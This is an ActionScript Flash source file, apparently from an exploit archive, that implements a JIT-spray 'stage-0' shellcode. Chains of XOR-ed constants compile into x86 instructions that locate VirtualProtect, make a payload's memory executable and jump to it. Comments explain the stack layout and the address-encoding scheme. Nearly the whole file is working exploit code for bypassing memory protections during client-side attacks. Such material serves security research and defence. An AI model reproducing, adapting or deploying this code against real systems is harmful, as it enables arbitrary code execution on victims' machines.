# Title: JITed stage-0 shellcode
# Author: Alexey Sintsov
# Download N/A

// JIT_S0.AS
//
// VirtualProtect() stage-0 shellcode
//
//        how to use stack
//
//      0000: 0x11111111   	-- ret addr to JIT satge0 shellcode
//      0004: 0x60616f62   	-- pointer on string atom (encoded high) if ret
//      0008: 0x60616f62   	-- pointer on string atom (encoded high) if ret 4
//	000c: 0x60616f62   	-- pointer on string atom (encoded high) if ret 8
//	0010: 0x6a616061   	-- pointer on string atom (encoded low)
//	0014: 0x6a616061   	-- pointer on string atom (encoded low)
//	0018: 0x6a616061   	-- pointer on string atom (encoded low)
//
//   This JIT shellcode find VirtualProtect, restore address of shellcode
//   Make mem exec and jump to it.
//
//
//   Restore function:
//	 ((high-0x60606060)<<4)+(low-0x60606060)
//   So 0x0a11f021 - original address.
//
//
//  By Alexey Sintsov
//	dookie@inbox.ru
//	a.sintsov@dsec.ru
//
//	DSecRG - Digital Security Research Group [dsecrg.com]
//

package {
    import flash.display.*
	public class Loadzz2 extends MovieClip
    {
		function funcXOR1()
		{
			var jit=(0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^0x3c909090^			0x3c44ec83^
			0x3c90C033^
			0x3c9030b0^
			0x3c008b64^
			0x3c0c408b^
			0x3c1c408b^
			0x3c08508b^
			0x3c20788b^
			0x3c90008b^
			0x6a6b3f80^
			0x3c90eA75^
			0x3c904747^
			0x6a653f80^
			0x3c90ef75^
			0x3c904747^
			0x6a723f80^
			0x3c90ef75^
			0x3c904747^
			0x6a6e3f80^
			0x3c90ef75^
			0x3c529090^
			0x3c3cc283^
			0x3c903a8b^
			0x3c24148b^
			0x3c90d703^
			0x3c78c283^
			0x3c903a8b^
			0x3c24148b^
			0x3c90d703^
			0x3c18c283^
			0x3c903a8b^
			0x3c04c283^
			0x3c901a8b^
			0x3c241c03^
			0x3c04c283^
			0x3c90328b^
			0x3c243403^
			0x3c04c283^
			0x3c900a8b^
			0x3c240c03^
			0x3cb89090^
			0x3c900000^
			0x3c9063b0^
			0x3c5074b4^
			0x3cb89090^
			0x3c906574^
			0x3c9072b0^
			0x3c506fb4^
			0x3cb89090^
			0x3c90506c^
			0x3c9075b0^
			0x3c5061b4^
			0x3cb89090^
			0x3c907472^
			0x3c9056b0^
			0x3c5069b4^
			0x3c90d78b^
			0x3c90C033^
			0x3c90ff33^
			0x3c535156^
			0x3c909090^
			0x3c909090^
			0x3c574790^
			0x3c24048b^
			0x3c02e0c1^
			0x3c90f003^
			0x3c90068b^
			0x3c20c483^
			0x3c240403^
			0x3c20ec83^
			0x3c90c933^
			0x3c900eb1^
			0x3c10c483^
			0x3c90f48b^
			0x3c90f88b^
			0x3c18c483^
			0x6a90a6f3^
			0x14901474^
			0x3c24ec83^
			0x3c595b5f^
			0x3c90905e^
			0x3c9090eb^
			0x3c24ec83^
			0x3c595b5f^
			0x3c90905e^
			0x3c90e7d1^
			0x3c90cf03^
			0x3c90c033^
			0x3c018b66^
			0x3c02e0c1^
			0x3c90c303^
			0x3c90188b^
			0x3c10c483^
			0x3c241c03^
			0x3c5cc483^
			0x3c909058^
			0x3c08c483^
			0x3cb9905a^
			0x3c906060^
			0x3c9060b1^
			0x3c9060b5^
			0x3c90c12b^
			0x3c90d12b^
			0x3c04e0c1^
			0x3c90c203^
			0x3c90388b^
			0x3c08c783^
			0x3c406a54^
			0x3c90016a^
			0x3cd3ff57^
			0x3c90e7ff^
			0x3ccccccc);
			return jit;
		}

		function Loadzz2()
		{
				var ret1=funcXOR1();
		}
    }
}